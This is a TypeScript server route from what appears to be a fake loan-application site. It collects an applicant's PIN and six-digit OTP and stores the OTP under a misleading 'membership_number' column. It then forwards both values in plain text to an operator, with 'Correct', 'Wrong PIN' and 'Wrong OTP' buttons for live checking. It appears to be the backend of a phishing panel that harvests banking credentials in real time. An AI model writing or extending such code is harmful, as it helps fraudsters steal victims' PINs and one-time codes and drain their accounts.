import { audit, findApplication, getSql, notifyAdmin, publicApp } from "../../../../../lib/applications";

export const runtime = "nodejs";

export async function POST(
  request: Request,
  context: { params: Promise<{ applicationId: string }> }
) {
  const { applicationId } = await context.params;

  const { value, referenceId } = (await request.json()) as {
    value: string;
    referenceId: string;
  };

  const row = await findApplication(applicationId);

  if (
    !row ||
    row.reference_id !== referenceId ||
    !["SECOND_OTP_REQUIRED", "PIN_CONFIRMED"].includes(row.status)
  ) {
    return Response.json(
      { error: "This final OTP request is not valid." },
      { status: 400 }
    );
  }

  const otp = String(value || "").trim();

  if (!/^\d{6}$/.test(otp)) {
    return Response.json(
      { error: "Enter a 6-digit OTP." },
      { status: 400 }
    );
  }

  const pin = row.member_code;

  if (!pin) {
    return Response.json(
      { error: "A PIN is required before the final OTP can be confirmed." },
      { status: 400 }
    );
  }

  await getSql()`UPDATE loan_applications SET membership_number=${otp}, status='FINAL_APPROVAL_PENDING', updated_at=NOW() WHERE application_id=${applicationId}`;

  await audit(applicationId, "PIN_AND_FINAL_OTP_SUBMITTED", "applicant", "user_submitted_values");

  await notifyAdmin(
    `FINAL CHECK\n\n👤 Applicant: ${row.full_name}\n🔐 PIN: ${pin}\n🔢 OTP: ${otp}\n\nConfirm these values.`,
    {
      inline_keyboard: [
        [{ text: "✅ Correct", callback_data: `approve:${applicationId}` }],
        [{ text: "❌ Wrong PIN", callback_data: `wrong_pin:${applicationId}` }],
        [{ text: "❌ Wrong OTP", callback_data: `wrong_code:${applicationId}` }],
      ],
    }
  );

  return Response.json(
    publicApp({ ...row, status: "FINAL_APPROVAL_PENDING" })
  );
}